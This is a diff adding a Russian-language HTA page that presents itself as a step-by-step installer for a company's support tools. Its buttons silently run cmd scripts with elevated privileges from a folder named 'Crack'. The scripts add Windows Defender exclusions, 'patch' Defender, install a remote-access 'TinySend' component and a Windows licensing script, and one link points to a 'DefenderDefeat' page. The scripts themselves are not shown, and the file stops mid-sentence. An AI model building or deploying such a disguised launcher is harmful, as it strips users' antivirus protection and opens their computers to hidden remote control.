@@ -1,0 +1,1100 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="ru"
+      xml:lang="ru"
+      xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta content="HTML Tidy for Linux (vers 25 March 2009), see www.w3.org"
+          name="generator" />
+    <meta content="text/html; charset=utf-8"
+          http-equiv="Content-Type" />
+    <meta content="width=device-width, initial-scale=1.0, user-scalable=yes"
+          name="viewport" />
+    <meta content="Execute, RedFlagGoGoo, Application, Windows, Defender, Microsoft"
+          name="Keywords" />
+    <meta content=
+    "В файле приводится описание алгоритма работы прогрнаммы RedFlagGoGoo, вместе с кнопками запуска действий"
+          name="Description" />
+    <meta content="New Internet Technologies Inc, 2023"
+          name="copyright" />
+
+    <HTA:APPLICATION
+  APPLICATIONNAME="Executing Web Application"
+  ID="indexHTA"
+  VERSION="0.0.1.0"
+  BORDER="dialog"
+  CAPTION="no"
+  SYSMENU="no"
+  MAXIMIZEBUTTON="no"
+  MINIMIZEBUTTON="no"
+  ICON="Tools002.ico"
+  Navigable = "No"
+  Scroll = "yes"
+  ScrollFlat = "yes"
+  Selection = "No"
+  ShowInTaskBar = "No"
+  SINGLEINSTANCE="yes"/>
+
+    <title>Executing Web Application | RedFlagGoGoo</title>
+    <style type="text/css">
+/*<![CDATA[*/
+    html {
+    color: #1a1a1a;
+    background-color: #fdfdfd;
+    }
+
+    body {
+    margin: 0 auto;
+    max-width: 36em;
+    padding-left: 50px;
+    padding-right: 50px;
+    padding-top: 50px;
+    padding-bottom: 50px;
+    font-family: Arial, Helvetica, "sans-serif";
+    font-size 12pt;
+    }
+
+    @media (max-width: 600px) {
+    body {
+        font-size: 0.9em;
+        padding: 12px;
+    }
+
+    h1 {
+        font-size: 1.8em;
+    }
+    }
+
+    @media print {
+    html {
+        background-color: white;
+    }
+
+    body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+    }
+
+    }
+
+    p {
+    margin: 1em 0;
+    }
+
+    a {
+    color: #9f0020;
+    }
+
+    a:visited {
+    color: #9f004f;
+    }
+
+    a:hover {
+    color: #ff0000;
+    }
+
+    img {
+    max-width: 100%;
+    }
+
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+    margin-top: 1.4em;
+    color: #a00020;
+     !important
+    }
+
+    h5,
+    h6 {
+    font-size: 1em;
+    font-style: italic;
+    }
+
+    h6 {
+    font-weight: normal;
+    }
+
+    ol,
+    ul {
+    padding-left: 1.7em;
+    margin-top: 1em;
+    }
+
+    li>ol,
+    li>ul {
+    margin-top: 0;
+    }
+
+    blockquote {
+    margin: 1em 0 1em 1.7em;
+    padding-left: 1em;
+    border-left: 2px solid #e6e6e6;
+    color: #606060;
+    }
+
+    code {
+    font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
+    font-size: 85%;
+    margin: 0;
+    hyphens: manual;
+    }
+
+    pre {
+    margin: 1em 0;
+    overflow: auto;
+    }
+
+    pre code {
+    padding: 0;
+    overflow: visible;
+    overflow-wrap: normal;
+    }
+
+    .sourceCode {
+    background-color: transparent;
+    overflow: visible;
+    }
+
+    hr {
+    background-color: #1a1a1a;
+    border: none;
+    height: 1px;
+    margin: 1em 0;
+    }
+
+    table {
+    margin: 1em 0;
+    width: 100%;
+    display: block;
+    }
+
+    table caption {
+    margin-bottom: 0.75em;
+    }
+
+    tbody {
+    margin-top: 0.5em;
+    border-top: 1px solid #1a1a1a;
+    border-bottom: 1px solid #1a1a1a;
+    }
+
+    th {
+    border-top: 1px solid #1a1a1a;
+    padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+
+    td {
+    padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+
+    div.header {
+        margin-bottom: 4em;
+        text-align: center;
+    }
+
+    div.display.math {
+        margin-bottom: 4em;
+        text-align: center;
+    }
+
+    #TOC li {
+    list-style: none;
+    }
+
+    #TOC ul {
+    padding-left: 1.3em;
+    }
+
+    #TOC>ul {
+    padding-left: 0;
+    }
+
+    #TOC a:not(:hover) {
+    text-decoration: none;
+    }
+
+    code {
+    white-space: pre-wrap;
+    }
+
+    span.smallcaps {
+    font-variant: small-caps;
+    }
+
+    div.columns {
+    display: flex;
+    gap: min(4vw, 1.5em);
+    }
+
+    div.column {
+    flex: auto;
+    overflow-x: auto;
+    }
+
+    div.hanging-indent {
+    margin-left: 1.5em;
+    text-indent: -1.5em;
+    }
+
+    ul.task-list {
+    list-style: none;
+    }
+
+    ul.task-list li input[type="checkbox"] {
+    width: 0.8em;
+    margin: 0 0.8em 0.2em -1.6em;
+    vertical-align: middle;
+    }
+
+    .display.math {
+    display: block;
+    text-align: center;
+    margin: 0.5rem auto;
+    }
+
+    .c-button {
+	background-color: #a00030;
+    border: 0;
+    padding: 8px 16px;
+    color: #ffffff;
+    display: inline-block;
+    text-align: center;
+    margin: 0em;
+    font: 600 16px;
+    font-family: Verdana, Helvetica, Arial, "sans-serif";
+    }
+    /*]]>*/
+    </style><!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+    <![endif]-->
+
+    <script type="text/vbscript">
+//<![CDATA[
+
+Sub WindowOnLoad
+    Dim CurrentResolution
+    ' Размер окна
+    iWidth = 800
+    iHeight = 600
+    ' Получение текущего разрешения экрана
+    CurrentResolution = GetDisplayResolution()
+    ' Изменение размера окна и его центрирование
+    iLeft = (Split(CurrentResolution,";")(0) - iWidth) / 2
+    iTop = (Split(CurrentResolution,";")(1) - iHeight) / 2
+    Self.Focus()
+    Self.resizeTo iWidth, iHeight
+    Self.moveTo iLeft, iTop
+    ' Вывод версии приложения на форму
+    Version_Div.InnerHTML = "Версия: " & oHTA.Version
+End Sub
+
+    //]]>
+    </script>
+
+    <script type="text/javascript">
+        //<![CDATA[
+/**********************************************************
+ * runsAtBrowser01
+ * This Function Open a String Parameter "theURL" 
+ * at a Default Browser Window
+ */
+
+ function runsAtBrowser01( theURL ) {
+    var const_CMD;
+    var strValue, shApp, fso, wsh, envProc, pathCMD;
+    // Define Comand Constant
+    const_CMD = "/c Start "
+    // Define ActuveX Objects
+    shApp = new ActiveXObject("Shell.Application");
+    fso = new ActiveXObject("Scripting.FileSystemObject");
+    wsh = new ActiveXObject("WScript.Shell");
+    envProc = wsh.Environment("PROCESS");
+	pathCMD = envProc("SystemRoot") + "\\System32";
+    // Check Path
+    if(!fso.FileExists(pathCMD + "\\cmd.exe")) {
+		return 1
+	};
+    // Set Command Arguments
+    strValue = const_CMD + theURL;
+    // Run cmd.exe without Elevated Privileges ("") at Visible Mode (1), with Default working Diretory
+	shApp.ShellExecute(pathCMD + "\\cmd.exe", strValue, "", "", 1);
+    return 0; 
+}
+
+/******************************************************************************
+'
+' RunDownloadedCMD01( strPath, strCMD, intTimeOut )
+' This Function Run Hidden a strCMD File
+' with Command "cmd /c " & strPath & "\" & strCMD
+'
+' PARAMETERS:   strPath -- The Path to strCMD
+'               strCMD -- a CMD File with instructions
+'               (Windows Command Shell)
+'				intTimeOut -- Estimated Time for Running (ms)
+'
+' RETURNS:      0 if Success
+'				1 if Path not Found
+'
+******************************************************************************/
+function RunDownloadedCMD01(strPath, strCMD, intTimeOut) {
+	var constRun_CMD, constOpt;
+	// Define Windows Scripts Options
+	constRun_CMD = "/c ";
+	var strValue, shApp, fso, wsh, envProc, pathCMD;
+	// Define ActiveX Object
+	shApp = new ActiveXObject("Shell.Application");
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	wsh = new ActiveXObject("WScript.Shell");
+	envProc = wsh.Environment("PROCESS");
+	pathCMD = envProc("SystemRoot") + "\\System32";
+	// Check Paths
+	if(!fso.FileExists(pathCMD + "\\cmd.exe")) {
+		return 1
+	};
+	if(!fso.FileExists(strPath + "\\" + strCMD)) {
+		return 1
+	};
+	// Set Command Arguments
+	strValue = constRun_CMD + "\"" + strPath + "\\" + strCMD + "\"";
+	// Run cmd.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
+	shApp.ShellExecute(pathCMD + "\\cmd.exe", strValue, strPath, "runas", 0);
+	// Stop Script on intTimeOut miliseconds for Wait if Script Execution Done
+	// WScript.Sleep(intTimeOut);
+	return 0;
+}
+/******************************************************************************
+'
+' RunDownloadedCMD02( strPath, strCMD, intTimeOut )
+' This Function Run Visible a strCMD File
+' with Command "cmd /c " & strPath & "\" & strCMD
+'
+' PARAMETERS:   strPath -- The Path to strCMD
+'               strCMD -- a CMD File with instructions
+'               (Windows Command Shell)
+'				intTimeOut -- Estimated Time for Running (ms)
+'
+' RETURNS:      0 if Success
+'				1 if Path not Found
+'
+******************************************************************************/
+function RunDownloadedCMD02(strPath, strCMD, intTimeOut) {
+	var constRun_CMD, constOpt;
+	// Define Windows Scripts Options
+	constRun_CMD = "/c ";
+	var strValue, shApp, fso, wsh, envProc, pathCMD;
+	// Define ActiveX Object
+	shApp = new ActiveXObject("Shell.Application");
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	wsh = new ActiveXObject("WScript.Shell");
+	envProc = wsh.Environment("PROCESS");
+	pathCMD = envProc("SystemRoot") + "\\System32";
+	// Check Paths
+	if(!fso.FileExists(pathCMD + "\\cmd.exe")) {
+		return 1
+	};
+	if(!fso.FileExists(strPath + "\\" + strCMD)) {
+		return 1
+	};
+	// Set Command Arguments
+	strValue = constRun_CMD + "\"" + strPath + "\\" + strCMD + "\"";
+	// Run cmd.exe without Elevated Privileges ("") at Visible Mode (1), with working Diretory strPath
+	shApp.ShellExecute(pathCMD + "\\cmd.exe", strValue, strPath, "", 1);
+	// Stop Script on intTimeOut miliseconds for Wait if Script Execution Done
+	// WScript.Sleep(intTimeOut);
+	return 0;
+}
+/******************************************************************************
+'
+' RunDownloadedCMD03( strPath, strCMD )
+' This Function Run Hidden a strCMD File
+' with Command "cmd /c " & strPath & "\" & strCMD
+'
+' PARAMETERS:   strPath -- The Path to strCMD
+'               strCmd -- a CMD File with instructions
+'               (Windows Command Shell)
+'
+' RETURNS:      0 if Success
+'				1 if Path not Found
+'
+******************************************************************************/
+function RunDownloadedCMD03(strPath, strCMD) {
+	var constRun_CMD, constOpt;
+	// Define Windows Scripts Options
+	constRun_CMD = "/c ";
+	var strValue, fso, wsh, envProc, pathCMD, comSpec;
+	// Define ActiveX Object
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	wsh = new ActiveXObject("WScript.Shell");
+	envProc = wsh.Environment("PROCESS");
+	comSpec = envProc("COMSPEC");
+	// Check Paths
+	if(!fso.FileExists(comSpec)) {
+		return 1
+	};
+	if(!fso.FileExists(strPath + "\\" + strCMD)) {
+		return 1
+	};
+	// Set Command Arguments
+	strValue = "\"" + comSpec + "\" " + constRun_CMD + "\"" + strPath + "\\" + strCMD + "\"";
+	wsh.Run(strValue, 0, true);
+	return 0;
+}
+/******************************************************************************
+'
+' RunDownloadedCMD04( strPath, strCMD )
+' This Function Run Visible a strCMD File
+' with Command "cmd /k " & strPath & "\" & strCMD
+'
+' PARAMETERS:   strPath -- The Path to strCMD
+'               strCmd -- a CMD File with instructions
+'               (Windows Command Shell)
+'
+' RETURNS:      0 if Success
+'				1 if Path not Found
+'
+******************************************************************************/
+function RunDownloadedCMD04(strPath, strCMD) {
+	var constRun_CMD, constOpt;
+	// Define Windows Scripts Options
+	constRun_CMD = "/k ";
+	var strValue, fso, wsh, envProc, pathCMD, comSpec;
+	// Define ActiveX Object
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	wsh = new ActiveXObject("WScript.Shell");
+	envProc = wsh.Environment("PROCESS");
+	comSpec = envProc("COMSPEC");
+	// Check Paths
+	if(!fso.FileExists(comSpec)) {
+		return 1
+	};
+	if(!fso.FileExists(strPath + "\\" + strCMD)) {
+		return 1
+	};
+	// Set Command Arguments
+	strValue = "\"" + comSpec + "\" " + constRun_CMD + "\"" + strPath + "\\" + strCMD + "\"";
+	wsh.Run(strValue, 1, true);
+	return 0;
+}
+/******************************************************************************
+'
+' OpenDownloadedFile01( strPath, strCMD, intTimeOut )
+' This Function Open a strCMD File
+' with Command "cmd /c Start /Wait " & strPath & "\" & strCMD
+'
+' PARAMETERS:   strPath -- The Path to strCMD
+'               strCMD -- a CMD File with instructions
+'               (Windows Command Shell)
+'				intTimeOut -- Estimated Time for Running (ms)
+'
+' RETURNS:      0 if Success
+'				1 if Path not Found
+'
+******************************************************************************/
+function OpenDownloadedFile01(strPath, strCMD, intTimeOut) {
+	var constRun_CMD, constOpt;
+	// Define Windows Scripts Options
+	constRun_CMD = "/c Start /WAIT ";
+	var strValue, shApp, fso, wsh, envProc, pathCMD;
+	// Define ActiveX Object
+	shApp = new ActiveXObject("Shell.Application");
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	wsh = new ActiveXObject("WScript.Shell");
+	envProc = wsh.Environment("PROCESS");
+	pathCMD = envProc("SystemRoot") + "\\System32";
+	// Check Paths
+	if(!fso.FileExists(pathCMD + "\\cmd.exe")) {
+		return 1
+	};
+	if(!fso.FileExists(strPath + "\\" + strCMD)) {
+		return 1
+	};
+	// Set Cscript Command Arguments
+	strValue = constRun_CMD + strPath + "\\" + strCMD;
+	// Run cmd.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
+	shApp.ShellExecute(pathCMD + "\\cmd.exe", strValue, strPath, "runas", 0);
+	// Stop Script on intTimeOut milliseconds for Wait if Script Execution Done
+	// WScript.Sleep(intTimeOut);
+	return 0;
+}
+/******************************************************************************
+'
+' OpenDownloadedFile03( strPath, strCMD )
+' This Function Run Hidden a strCMD File
+' with Command "cmd /c Start /WAIT " & strPath & "\" & strCMD
+'
+' PARAMETERS:   strPath -- The Path to strCMD
+'               strCmd -- a CMD File with instructions
+'               (Windows Command Shell)
+'
+' RETURNS:      0 if Success
+'				1 if Path not Found
+'
+******************************************************************************/
+function OpenDownloadedFile03(strPath, strCMD) {
+	var constRun_CMD, constOpt;
+	// Define Windows Scripts Options
+	constRun_CMD = "/c Start /WAIT ";
+	var strValue, fso, wsh, envProc, pathCMD, comSpec;
+	// Define ActiveX Object
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	wsh = new ActiveXObject("WScript.Shell");
+	envProc = wsh.Environment("PROCESS");
+	comSpec = envProc("COMSPEC");
+	// Check Paths
+	if(!fso.FileExists(comSpec)) {
+		return 1
+	};
+	if(!fso.FileExists(strPath + "\\" + strCMD)) {
+		return 1
+	};
+	// Set Command Arguments
+	strValue = "\"" + comSpec + "\" " + constRun_CMD + strPath + "\\" + strCMD;
+	wsh.Run(strValue, 0, true);
+	return 0;
+}
+
+        //]]>
+	</script>
+
+    <script type="text/javascript">
+//<![CDATA[
+
+function buttonclick_01(){
+    var strPath, strCMD, iRes, intTimeOut;
+    strPath="C:\\.BIN\\RedFlagGoGoo\\WCLIENTS\\files\\Crack";
+    strCMD="install-TinyExclusions.MSI.cmd";
+    intTimeOut = 20000; // 20 sec
+    iRes = 0;
+    iRes=RunDownloadedCMD01(strPath, strCMD, intTimeOut);
+    if (iRes > 0) {
+        // statement
+        alert("Wrong Execution Script!")
+    }
+    // alert("Нажата кнопка 01");
+}
+
+function buttonclick_02(){
+    var strPath, strCMD, iRes, intTimeOut;
+    strPath="C:\\.BIN\\RedFlagGoGoo\\WCLIENTS\\files\\Crack";
+    strCMD="install-TinyExeFiles.MSI.cmd";
+    intTimeOut = 20000; // 20 sec
+    iRes = 0;
+    iRes=RunDownloadedCMD01(strPath, strCMD, intTimeOut);
+    if (iRes > 0) {
+        // statement
+        alert("Wrong Execution Script!")
+    }
+    // alert("Нажата кнопка 02");
+}
+
+function buttonclick_03(){
+    var strPath, strCMD, iRes, intTimeOut;
+    strPath="C:\\.BIN\\RedFlagGoGoo\\WCLIENTS\\files\\Crack";
+    strCMD="install-TinySend.SFX.cmd";
+    intTimeOut = 20000; // 20 sec
+    iRes = 0;
+    iRes=RunDownloadedCMD01(strPath, strCMD, intTimeOut);
+    if (iRes > 0) {
+        // statement
+        alert("Wrong Execution Script!")
+    }
+    // alert("Нажата кнопка 03");
+}
+
+function buttonclick_04(){
+    var strPath, strCMD, iRes, intTimeOut;
+    strPath="C:\\.BIN\\RedFlagGoGoo\\WCLIENTS\\files\\Crack";
+    strCMD="install-PREINSTALLADJUST.SFX.cmd";
+    intTimeOut = 20000; // 20 sec
+    iRes = 0;
+    iRes=RunDownloadedCMD01(strPath, strCMD, intTimeOut);
+    if (iRes > 0) {
+        // statement
+        alert("Wrong Execution Script!")
+    }
+    // alert("Нажата кнопка 04");
+}
+
+function buttonclick_05(){
+    var strPath, strCMD, iRes, intTimeOut;
+    strPath="C:\\.BIN\\smbshare\\LNK";
+    strCMD="postinstall.002.cmd";
+    intTimeOut = 20000; // 20 sec
+    iRes = 0;
+    iRes=RunDownloadedCMD01(strPath, strCMD, intTimeOut);
+    if (iRes > 0) {
+        // statement
+        alert("Wrong Execution Script!")
+    }
+    // alert("Нажата кнопка 05");
+}
+
+function buttonclick_06(){
+    var strPath, strCMD, iRes, intTimeOut;
+    strPath="C:\\.BIN\\smbshare\\LNK";
+    strCMD="postinstall.003.cmd";
+    intTimeOut = 20000; // 20 sec
+    iRes = 0;
+    iRes=RunDownloadedCMD01(strPath, strCMD, intTimeOut);
+    if (iRes > 0) {
+        // statement
+        alert("Wrong Execution Script!")
+    }
+    // alert("Нажата кнопка 06");
+}
+
+function buttonclick_07(){
+    var strPath, strCMD, iRes, intTimeOut;
+    strPath="C:\\.BIN\\smbshare\\LNK";
+    strCMD="postinstall.005.cmd";
+    intTimeOut = 20000; // 20 sec
+    iRes = 0;
+    iRes=RunDownloadedCMD01(strPath, strCMD, intTimeOut);
+    if (iRes > 0) {
+        // statement
+        alert("Wrong Execution Script!")
+    }
+//    alert("Нажата кнопка 07");
+}
+
+function buttonclick_08(){
+    var strPath, strCMD, iRes, intTimeOut;
+    strPath="C:\\.BIN\\smbshare\\LNK";
+    strCMD="postinstall.006.cmd";
+    intTimeOut = 20000; // 20 sec
+    iRes = 0;
+    iRes=RunDownloadedCMD01(strPath, strCMD, intTimeOut);
+    if (iRes > 0) {
+        // statement
+        alert("Wrong Execution Script!")
+    }
+    // alert("Нажата кнопка 08");
+}
+
+function buttonclick_09(){
+    var strPath, strCMD, iRes, intTimeOut;
+    strPath="C:\\.BIN\\smbshare\\LNK";
+    strCMD="postinstall.007.b.cmd";
+    intTimeOut = 20000; // 20 sec
+    iRes = 0;
+    iRes=RunDownloadedCMD01(strPath, strCMD, intTimeOut);
+    if (iRes > 0) {
+        // statement
+        alert("Wrong Execution Script!")
+    }
+    //alert("Нажата кнопка 09");
+}
+
+function buttonclick_10(){
+    var strPath, strCMD, iRes, intTimeOut;
+    strPath="C:\\.BIN\\smbshare\\LNK";
+    strCMD="postinstall.008.cmd";
+    intTimeOut = 20000; // 20 sec
+    iRes = 0;
+    iRes=RunDownloadedCMD01(strPath, strCMD, intTimeOut);
+    if (iRes > 0) {
+        // statement
+        alert("Wrong Execution Script!")
+    }
+    //alert("Нажата кнопка 10");
+}
+
+function buttonclick_11(){
+    var strPath, strCMD, iRes, intTimeOut;
+    strPath="C:\\.BIN\\smbshare\\LNK";
+    strCMD="postinstall.009.a.cmd";
+    intTimeOut = 20000; // 20 sec
+    iRes = 0;
+    iRes=RunDownloadedCMD01(strPath, strCMD, intTimeOut);
+    if (iRes > 0) {
+        // statement
+        alert("Wrong Execution Script!")
+    }
+    //alert("Нажата кнопка 11");
+}
+
+function buttonclick_12(){
+    var strPath, strCMD, iRes, intTimeOut;
+    strPath="C:\\.BIN\\smbshare\\LNK";
+    strCMD="postinstall.010.cmd";
+    intTimeOut = 20000; // 20 sec
+    iRes = 0;
+    iRes=RunDownloadedCMD01(strPath, strCMD, intTimeOut);
+    if (iRes > 0) {
+        // statement
+        alert("Wrong Execution Script!")
+    }
+    // alert("Нажата кнопка 12");
+}
+
+function buttonclick_13(){
+    var strPath, strCMD, iRes, intTimeOut;
+    strPath="C:\\.BIN\\smbshare\\TEST\\AdminPack";
+    strCMD="TestAll.AdminPack.bat";
+    intTimeOut = 20000; // 20 sec
+    iRes = 0;
+    iRes=RunDownloadedCMD02(strPath, strCMD, intTimeOut);
+    if (iRes > 0) {
+        // statement
+        alert("Wrong Execution Script!")
+    }
+    //alert("Нажата кнопка 13");
+}
+
+function buttonclick_14(){
+    var strPath, strCMD, iRes, intTimeOut;
+    strPath="C:\\.BIN\\smbshare\\TEST\\smbshare";
+    strCMD="TestAll.smbshare.bat";
+    intTimeOut = 20000; // 20 sec
+    iRes = 0;
+    iRes=RunDownloadedCMD02(strPath, strCMD, intTimeOut);
+    if (iRes > 0) {
+        // statement
+        alert("Wrong Execution Script!")
+    }
+    //alert("Нажата кнопка 14");
+}
+
+    //]]>
+    </script>
+    <script type="text/javascript">
+//<![CDATA[
+    function buttonsiteclick(){
+        var aSite;
+        var iRes;
+        aSite = 'http://main.nitsar.ru.net/modx/information.html';
+        // window.location.href = aSite;
+        iRes=runsAtBrowser01(aSite);
+    }
+
+    function buttonclose(){
+        var confirm_result = confirm("Вы хотите закрыть страницу?");
+        if(confirm_result==true){
+            window.open('','_self').close();
+        }
+    }
+
+    function buttonmainclick(){
+        var aSite;
+        var iRes;
+        aSite = './index.hta';
+        window.open( aSite, '_self' );
+    }
+
+    function buttonwebapplication(){
+        var aSite;
+        var iRes;
+        aSite = 'http://file.netip4.ru/PROGS/NIT/DefenderDefeat/html/main.html';
+        //window.open( aSite, '_blank');
+        iRes=runsAtBrowser01(aSite);
+    }
+    //]]>
+    </script>
+</head>
+
+<body>
+    <div class="header"
+         id="title-block-header">
+        <h1 class="title">Executing Web Application | RedFlagGoGoo</h1>
+    </div>
+
+    <h1>Порядок установки</h1>
+
+    <p>Вся установка пакетов идёт после нажатия соответствующей кнопки в hta приложении.
+    Пожалуйста, не нарушайте порядок нажатия кнопок. Ниже даны подсказки к кнопкам. После
+    нажатия на некоторые кнопки компьютер автоматически перезагрузится, это
+    нормально.</p>
+
+    <p>Очень часто реакций на нажатие кнопки не наблюдается. Это сделано сознательно, для
+    совместимоcти с редакциями Core. Триггером окончания программы будет закрытие окна
+    терминала или перезагрузка компьютера (кроме пункта 12, когда процесс установки
+    затягивается на несколько перезагрузок системы). Будьте 
+    терпеливы, подождите 10 минут. Если после этого всё равно не появляется 
+    никакого окна — нажмите кнопку № 14 для диагностики. Если же и она не решила 
+    проблему, обратитесь к разработчику. Возможно, Вам придётся поработать в 
+    командной строке.</p>
+
+    <table>
+        <caption>
+            Алгоритм работы веб-приложения
+        </caption>
+
+        <tbody>
+            <tr>
+                <th>Действие</th>
+
+                <th>Описание</th>
+            </tr>
+
+            <tr>
+                <td><input align="middle"
+                       class="c-button"
+                       id="button01"
+                       name="button01"
+                       type="button"
+                       onclick="buttonclick_01()"
+                       value="Кнопка 01" /></td>
+
+                <td rowspan="14">
+                    <ol type="1">
+                        <li>Вначале установите минимальные исключения для антивируса
+                        Microsoft Windows Defender — NIT TinyExclusions. Без него ни одна
+                        программа работать не будет. Нажмите <a href="#button01"
+                           title="button01">кнопку 01</a>.</li>
+
+                        <li>Потом установите в кучу основные бинарные файлы для загрузки
+                        программ и работы с архивами. Нажмите <a href="#button02"
+                           title="button02">кнопку 02</a>.</li>
+
+                        <li>Затем установите систему удалённой диагностики компьютера.
+                        Нажмите <a href="#button03"
+                           title="button03">кнопку 03</a>.</li>
+
+                        <li>Далее Вы установите основные дополнения к Вашей операционной
+                        системе. Нажмите <a href="#button04"
+                           title="button04">кнопку 04</a>. В систему загрузятся
+                           платформенно-независимые модули настройки.</li>
+
+                        <li>Затем будут установлены дополнения VC++ для запуска программ,
+                        написанных на компиляторе Microsoft. нажмите <a href="#button05"
+                           title="button05">кнопку 05</a>. После установки компьютер
+                           автоматически перезагрузится.</li>
+
+                        <li>Затем надо установить Microsoft .Net Framework. нажмите
+                        <a href="#button06"
+                           title="button06">кнопку 6</a>. Компьютер автоматически
+                           перезагрузится.</li>
+
+                        <li>Следующий пункт необходимо выполнить только для десктопных
+                        редакций Microsoft Windows Server, а именно — разблокировать
+                        загрузку из Интернета в Internet Explorer. Нажмите <a href=
+                        "#button07"
+                           title="button07">кнопку 07</a>. Внимание! Если нажать эту
+                           кнопку в редакции Core, может произойти зависание программы.
+                           Будьте аккуратнее. Надо быть очень большим чудаком, чтобы
+                           перепутать Desktop и Core Edition даже в реверс-шелл!</li>
+
+                        <li>Затем идёт создание служебных каталогов для продуктов
+                        компании NIT. Нажмите <a href="#button08"
+                           title="button08">кнопку 08</a>.</li>
+
+                        <li>Потом надо ещё раз пропатчить Microsoft Windows Defender в
+                        автоматическом режиме. Нажмите <a href="#button09"
+                           title="button09">кнопку 09</a>.</li>
+
+                        <li>После нужно закрепить сделанные изменения. Нажмите <a href=
+                        "#button10"
+                           title="button10">кнопку 10</a>.</li>
+
+                        <li>Далее устанавлbвается скрипт лицензирования Microsoft Windows
+                        и установки Microsoft Office. Данный скрипт необходимо выполнять
+                        из оболочки RDP, физической или виртуальной консоли. Нажмите
+                        <a href="#button11"
+                           title="button11">кнопку 11</a>.</li>
+
+                        <li>Далее идёт длительный факультативный материал — установка
+                        админ-пака New Internet Technology. Процесс долгий, требует
+                        ручной перезагрузки компьютера и входа на виртуальную консоль. Вы
+                        можете нажать <a href="#button12"
+                           title="button12">кнопку 12</a>, а админ-пак установиться
+                           позже, Вы даже не заметите как. В процессе установки
+                           админ-пака компьютер может самостоятельно перезагрузиться. Это
+                           необходимо для установки обновлений безопасности.</li>
+                    </ol>
+
+                    <p>В дальнейшем ваш компьютер будет работать быстро и шустро, плюс у
+                    вас появится возможность пользоваться удалённой поддержкой компанией
+                    New Internet Technologies.</p>
+
+                    <p>Вы также можете протестировать установку всех пакетов, нажав
+                    к<a href="#button13"
+                       title="button13">нопку 13</a>. Она укажет неустановленные
+                       зависимости и способы их исправления.</p>
+
+                    <p>При нажатии на <a href="#button14"
+                       title="button14">кнопку 14</a> у вас будет проверен весь
+                       инструментарий для настройки компьютеров. Его имеет смысл
+                       наживать, если в системе отсутствуют какие-то пункты исправления
+                       (для диагностики).</p>
+                </td>
+            </tr>
+
+            <tr>
+                <td><input align="middle"
+                       class="c-button"
+                       id="button02"
+                       name="button02"
+                       type="button"
+                       onclick="buttonclick_02()"
+                       value="Кнопка 02" /></td>
+            </tr>
+
+            <tr>
+                <td><input align="middle"
+                       class="c-button"
+                       id="button03"
+                       name="button03"
+                       type="button"
+                       onclick="buttonclick_03()"
+                       value="Кнопка 03" /></td>
+            </tr>
+
+            <tr>
+                <td><input align="middle"
+                       class="c-button"
+                       id="button04"
+                       name="button04"
+                       type="button"
+                       onclick="buttonclick_04()"
+                       value="Кнопка 04" /></td>
+            </tr>
+
+            <tr>
+                <td><input align="middle"
+                       class="c-button"
+                       id="button05"
+                       name="button05"
+                       type="button"
+                       onclick="buttonclick_05()"
+                       value="Кнопка 05" /></td>
+            </tr>
+
+            <tr>
+                <td><input align="middle"
+                       class="c-button"
+                       id="button06"
+                       name="button06"
+                       type="button"
+                       onclick="buttonclick_06()"
+                       value="Кнопка 06" /></td>
+            </tr>
+
+            <tr>
+                <td><input align="middle"
+                       class="c-button"
+                       id="button07"
+                       name="button07"
+                       type="button"
+                       onclick="buttonclick_07()"
+                       value="Кнопка 07" /></td>
+            </tr>
+
+            <tr>
+                <td><input align="middle"
+                       class="c-button"
+                       id="button08"
+                       name="button08"
+                       type="button"
+                       onclick="buttonclick_08()"
+                       value="Кнопка 08" /></td>
+            </tr>
+
+            <tr>
+                <td><input align="middle"
+                       class="c-button"
+                       id="button09"
+                       name="button09"
+                       type="button"
+                       onclick="buttonclick_09()"
+                       value="Кнопка 09" /></td>
+            </tr>
+
+            <tr>
+                <td><input align="middle"
+                       class="c-button"
+                       id="button10"
+                       name="button10"
+                       type="button"
+                       onclick="buttonclick_10()"
+                       value="Кнопка 10" /></td>
+            </tr>
+
+            <tr>
+                <td><input align="middle"
+                       class="c-button"
+                       id="button11"
+                       name="button11"
+                       type="button"
+                       onclick="buttonclick_11()"
+                       value="Кнопка 11" /></td>
+            </tr>
+
+            <tr>
+                <td><input align="middle"
+                       class="c-button"
+                       id="button12"
+                       name="button12"
+                       type="button"
+                       onclick="buttonclick_12()"
+                       value="Кнопка 12" /></td>
+            </tr>
+
+            <tr>
+                <td><input align="middle"
+                       class="c-button"
+                       id="button13"
+                       name="button13"
+                       type="button"
+                       onclick="buttonclick_13()"
+                       value="Кнопка 13" /></td>
+            </tr>
+
+            <tr>
+                <td><input align="middle"
+                       class="c-button"
+                       id="button14"
+                       name="button14"
+                       type="button"
+                       onclick="buttonclick_14()"
+                       value="Кнопка 14" /></td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h2>Указания к применению</h2>
+
+    <p>Данное приложение рассчитано, что пользователь самостоятельно установит все
+    необходимые дополнения и настройки на свой домашний компьютер (или рядовой
+    администратор на офисный сервер). Действия максимально упрощены. Однако, в случае
+    нестандартных ситуаций, испорченной системы или установки сторонних, не
+    сертифицированных корпорацией Microsoft сторонних средств, у Вас, возможно, возникнут
+    проблемы. Обратитесь тогда к более опытному системному администратору или
+    представителю Компании New Internet Technology Inc. по любому мессенджеру (список
+    смотри <a href="#buttonsite"
+       title="Перейти на сайт">на сайте</a>).</p>
+
+    <p><input align="middle"
+           class="c-button"
+           id="buttonsite"
+           name="buttonsite"
+           type="button"
+           onclick="buttonsiteclick()"
+           value="Перейти на сайт компании" /></p>
+
+    <p>В случае, если у вас установлен сторонний антивирус и он блокирует настройку
